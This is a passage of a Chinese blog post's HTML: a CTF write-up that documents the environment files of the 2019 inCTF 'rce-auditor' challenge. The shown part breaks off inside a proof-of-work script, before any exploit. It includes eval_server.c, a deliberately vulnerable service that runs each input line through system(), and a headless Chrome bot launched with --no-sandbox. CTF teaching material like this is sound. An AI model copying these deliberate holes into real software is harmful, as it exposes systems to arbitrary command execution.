@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言2019inCTF的rce-auditor的环境搭建到解决的详细过程 0x02 rce-auditor环境的文件目录如下： 下面是每个目录和文件的介绍。docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。docker目录下的flag目录。 flag文件的内容是你要通过利用获取的。 readflag文件是编译好的二">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019inCTF的rce-auditor的环境搭建到解决的详细过程">
+<meta property="og:url" content="http://yoursite.com/2019/12/17/2019inCTF的rce-auditor的环境搭建到解决的详细过程/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言2019inCTF的rce-auditor的环境搭建到解决的详细过程 0x02 rce-auditor环境的文件目录如下： 下面是每个目录和文件的介绍。docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。docker目录下的flag目录。 flag文件的内容是你要通过利用获取的。 readflag文件是编译好的二">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_rce_auditor_1.PNG">
+<meta property="og:updated_time" content="2019-12-16T16:13:18.621Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019inCTF的rce-auditor的环境搭建到解决的详细过程">
+<meta name="twitter:description" content="前言2019inCTF的rce-auditor的环境搭建到解决的详细过程 0x02 rce-auditor环境的文件目录如下： 下面是每个目录和文件的介绍。docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。docker目录下的flag目录。 flag文件的内容是你要通过利用获取的。 readflag文件是编译好的二">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_rce_auditor_1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/17/2019inCTF的rce-auditor的环境搭建到解决的详细过程/">
+
+
+
+
+
+  <title>2019inCTF的rce-auditor的环境搭建到解决的详细过程 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/17/2019inCTF的rce-auditor的环境搭建到解决的详细过程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019inCTF的rce-auditor的环境搭建到解决的详细过程</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-17T00:08:05+08:00">
+                2019-12-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  16
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>2019inCTF的rce-auditor的环境搭建到解决的详细过程</p>
+<h5 id="0x02-rce-auditor"><a href="#0x02-rce-auditor" class="headerlink" title="0x02 rce-auditor"></a>0x02 rce-auditor</h5><h6 id="环境的文件目录如下："><a href="#环境的文件目录如下：" class="headerlink" title="环境的文件目录如下："></a>环境的文件目录如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019inCTF_rce_auditor_1.PNG" alt></p>
+<h6 id="下面是每个目录和文件的介绍。"><a href="#下面是每个目录和文件的介绍。" class="headerlink" title="下面是每个目录和文件的介绍。"></a>下面是每个目录和文件的介绍。</h6><h6 id="docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。"><a href="#docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。" class="headerlink" title="docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。"></a><code>docker</code>目录存放的是环境的基本文件，而<code>exploit</code>存放的是解决该问题的文件，下面将从<code>docker</code>目录开始详细的每一个文件的内容。</h6><h6 id="docker目录下的flag目录。"><a href="#docker目录下的flag目录。" class="headerlink" title="docker目录下的flag目录。"></a><code>docker</code>目录下的<code>flag</code>目录。</h6><ul>
+<li><code>flag</code>文件的内容是你要通过利用获取的。</li>
+<li><code>readflag</code>文件是编译好的二进制文件的，要通过拿到shell执行它获取<code>flag</code>的内容。</li>
+<li><code>readflag.c</code>文件是编译之前的<code>readflag</code>的<code>.c</code>文件，内容如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  FILE *f = fopen(<span class="string">"/flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  fgets(buf, <span class="number">256</span>, f);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  fclose(f);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="docker目录下的nginx文件夹。"><a href="#docker目录下的nginx文件夹。" class="headerlink" title="docker目录下的nginx文件夹。"></a><code>docker</code>目录下的<code>nginx</code>文件夹。</h6><ul>
+<li><code>default</code>文件是<code>nginx</code>的配置文件，内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name _;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        include proxy_params;</span><br><span class="line">        proxy_pass http://unix:/home/user/sock/server.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="这个配置文件是代理80端口的将http请求代理到unixsocket。"><a href="#这个配置文件是代理80端口的将http请求代理到unixsocket。" class="headerlink" title="这个配置文件是代理80端口的将http请求代理到unixsocket。"></a>这个配置文件是代理<code>80</code>端口的将<code>http</code>请求代理到<code>unixsocket</code>。</h6><h6 id="docker目录下的redis文件夹。"><a href="#docker目录下的redis文件夹。" class="headerlink" title="docker目录下的redis文件夹。"></a><code>docker</code>目录下的<code>redis</code>文件夹。</h6><ul>
+<li><code>redis.conf</code>文件是<code>redis</code>的配置文件。</li>
+</ul>
+<h6 id="docker目录的user文件夹。"><a href="#docker目录的user文件夹。" class="headerlink" title="docker目录的user文件夹。"></a><code>docker</code>目录的<code>user</code>文件夹。</h6><ul>
+<li><code>pow</code>目录暂时没有东西。</li>
+<li><code>sock</code>目录暂时没有东西。</li>
+<li><code>chrome_headless.py</code>的内容如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException, WebDriverException</span><br><span class="line"></span><br><span class="line">loading_page_time_sec = <span class="number">5</span></span><br><span class="line">browsing_page_time_sec = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">browse</span><span class="params">(url)</span>:</span></span><br><span class="line">    options = Options()</span><br><span class="line">    options.headless = <span class="literal">True</span></span><br><span class="line">    options.add_argument(<span class="string">'--no-sandbox'</span>) <span class="comment"># https://stackoverflow.com/a/45846909</span></span><br><span class="line">    options.add_argument(<span class="string">'--disable-dev-shm-usage'</span>) <span class="comment"># https://stackoverflow.com/a/50642913</span></span><br><span class="line">    chrome = Chrome(options=options)</span><br><span class="line">    <span class="comment"># https://stackoverflow.com/a/47695227</span></span><br><span class="line">    chrome.set_page_load_timeout(loading_page_time_sec)</span><br><span class="line">    chrome.set_script_timeout(loading_page_time_sec)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chrome.get(url)</span><br><span class="line">        time.sleep(browsing_page_time_sec)</span><br><span class="line">    <span class="keyword">except</span> (TimeoutException, WebDriverException):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        chrome.quit()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="下面大体介绍一下这个函数："><a href="#下面大体介绍一下这个函数：" class="headerlink" title="下面大体介绍一下这个函数："></a>下面大体介绍一下这个函数：</h6><ul>
+<li><code>2~6</code>行主要导入所需的模块。</li>
+<li><code>8</code>行设置了请求页面时的超时时间。</li>
+<li><code>9</code>行设置了执行javascript脚本超时时间。</li>
+<li><code>12</code>行初始化<code>chrome</code>的设置参数实例。</li>
+<li><code>13</code>行设置浏览器为无界面运行。</li>
+<li><code>14</code>行设置浏览器为非沙盒模式运行。</li>
+<li><code>15</code>行<a href="https://stackoverflow.com/a/50642913" target="_blank" rel="noopener">详细链接</a></li>
+<li><code>16~19</code>将上面提到的参数设置到<code>chrome</code>中。</li>
+<li><code>21</code>模仿浏览器发起get请求。</li>
+<li><code>22</code>进程阻塞了<code>5</code>秒。</li>
+<li><code>26</code>行关闭所有的窗口。</li>
+</ul>
+<h6 id="config-py的内容如下："><a href="#config-py的内容如下：" class="headerlink" title="config.py的内容如下："></a><code>config.py</code>的内容如下：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">difficulty = <span class="number">18</span></span><br><span class="line">debug = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="是一个基本配置。"><a href="#是一个基本配置。" class="headerlink" title="是一个基本配置。"></a>是一个基本配置。</h6><h6 id="eval-server是eval-server-c编译后的二进制文件。"><a href="#eval-server是eval-server-c编译后的二进制文件。" class="headerlink" title="eval_server是eval_server.c编译后的二进制文件。"></a><code>eval_server</code>是<code>eval_server.c</code>编译后的二进制文件。</h6><h6 id="eval-server-c的内容如下："><a href="#eval-server-c的内容如下：" class="headerlink" title="eval_server.c的内容如下："></a><code>eval_server.c</code>的内容如下：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Run this command to start the server.</span></span><br><span class="line"><span class="comment"> * The ncat is from zmap package.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * ncat -klv 127.0.0.1 6666 -c 'timeout 30 ./eval_server'</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">1024</span>]; <span class="comment">// It's vulnerable to buffer overflow. Let's pwn it. Just trigger exit(), right?</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, buffer+count, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (buffer[count] != <span class="string">'\r'</span> &amp;&amp; buffer[count] != <span class="string">'\n'</span>) </span><br><span class="line">      read(<span class="number">0</span>, &amp;buffer[++count], <span class="number">1</span>);</span><br><span class="line">    buffer[count] = <span class="string">'\0'</span>;</span><br><span class="line">    system(buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="大家可以自己运行一下看看结果。"><a href="#大家可以自己运行一下看看结果。" class="headerlink" title="大家可以自己运行一下看看结果。"></a>大家可以自己运行一下看看结果。</h6><h6 id="powser-py的内容："><a href="#powser-py的内容：" class="headerlink" title="powser.py的内容："></a><code>powser.py</code>的内容：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Powser</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            self,</span></span></span><br><span class="line"><span class="function"><span class="params">            db_path,</span></span></span><br><span class="line"><span class="function"><span class="params">            difficulty=<span class="number">16</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            clean_expired_rows_per=<span class="number">1000</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            prefix_length=<span class="number">16</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            default_expired_time=None,</span></span></span><br><span class="line"><span class="function"><span class="params">            min_refresh_time=None</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span>:</span></span><br><span class="line">        self.db = sqlite3.connect(db_path)</span><br><span class="line">        self.difficulty = difficulty</span><br><span class="line">        self.clean_expired_rows_per = clean_expired_rows_per</span><br><span class="line">        self.prefix_length = prefix_length</span><br><span class="line">        <span class="keyword">if</span> default_expired_time <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.default_expired_time = max(<span class="number">600</span>, <span class="number">2</span>**(difficulty<span class="number">-16</span>))</span><br><span class="line">        <span class="keyword">if</span> min_refresh_time <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.min_refresh_time = self.default_expired_time // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        self._insert_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._table_exists():</span><br><span class="line">            self._create_table()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_challenge</span><span class="params">(self, ip)</span>:</span></span><br><span class="line">        row = self.db.execute(<span class="string">'SELECT prefix, valid_until FROM pow WHERE ip=?'</span>, (ip, )).fetchone()</span><br><span class="line">        <span class="keyword">if</span> row <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> self._insert_client(ip)</span><br><span class="line"></span><br><span class="line">        prefix, valid_until = row</span><br><span class="line">        time_remain = valid_until - int(time())</span><br><span class="line">        <span class="keyword">if</span> time_remain &lt;= self.min_refresh_time:</span><br><span class="line">            <span class="keyword">return</span> self._insert_client(ip)</span><br><span class="line">        <span class="keyword">return</span> prefix, time_remain</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_client</span><span class="params">(self, ip, answer, with_msg=False)</span>:</span></span><br><span class="line">        row = self.db.execute(<span class="string">'SELECT valid_until, prefix FROM pow WHERE ip=?'</span>, (ip, )).fetchone()</span><br><span class="line">        <span class="keyword">if</span> row <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">'Please get a new PoW challenge.'</span>) <span class="keyword">if</span> with_msg <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        valid_until, prefix = row</span><br><span class="line">        <span class="keyword">if</span> time() &gt; valid_until:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">'The Pow challenge is expired.'</span>) <span class="keyword">if</span> with_msg <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        result = self._verify_hash(prefix, answer)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, <span class="string">'The hash is incorrect.'</span>) <span class="keyword">if</span> with_msg <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        self._insert_client(ip)</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>, <span class="string">'Okay.'</span>) <span class="keyword">if</span> with_msg <span class="keyword">else</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_expired</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.db.execute(<span class="string">'DELETE FROM pow WHERE valid_until &lt; strftime("%s", "now")'</span>)</span><br><span class="line">        self.db.commit()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.db.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify_hash</span><span class="params">(self, prefix, answer)</span>:</span></span><br><span class="line">        h = hashlib.sha256()</span><br><span class="line">        print(prefix+answer)</span><br><span class="line">        h.update((prefix + answer).encode())</span><br><span class="line">        bits = <span class="string">''</span>.join(bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> h.digest())</span><br><span class="line">        print(bits)</span><br><span class="line">        zeros = <span class="string">'0'</span> * self.difficulty</span><br><span class="line">        <span class="keyword">return</span> bits[:self.difficulty] == zeros</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_insert_client</span><span class="params">(self, ip)</span>:</span></span><br><span class="line">        self._insert_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.clean_expired_rows_per &gt; <span class="number">0</span> <span class="keyword">and</span> self._insert_count % self.clean_expired_rows_per == <span class="number">0</span>:</span><br><span class="line">            self.clean_expired()</span><br><span class="line">        prefix = secrets.token_urlsafe(self.prefix_length)</span><br><span class="line">        valid_until = int(time()) + self.default_expired_time</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'ip'</span>: ip,</span><br><span class="line">            <span class="string">'valid_until'</span>: valid_until,</span><br><span class="line">            <span class="string">'prefix'</span>: prefix</span><br><span class="line">        &#125;</span><br><span class="line">        self.db.execute(<span class="string">'INSERT OR REPLACE INTO pow VALUES(:ip, :valid_until, :prefix)'</span>, 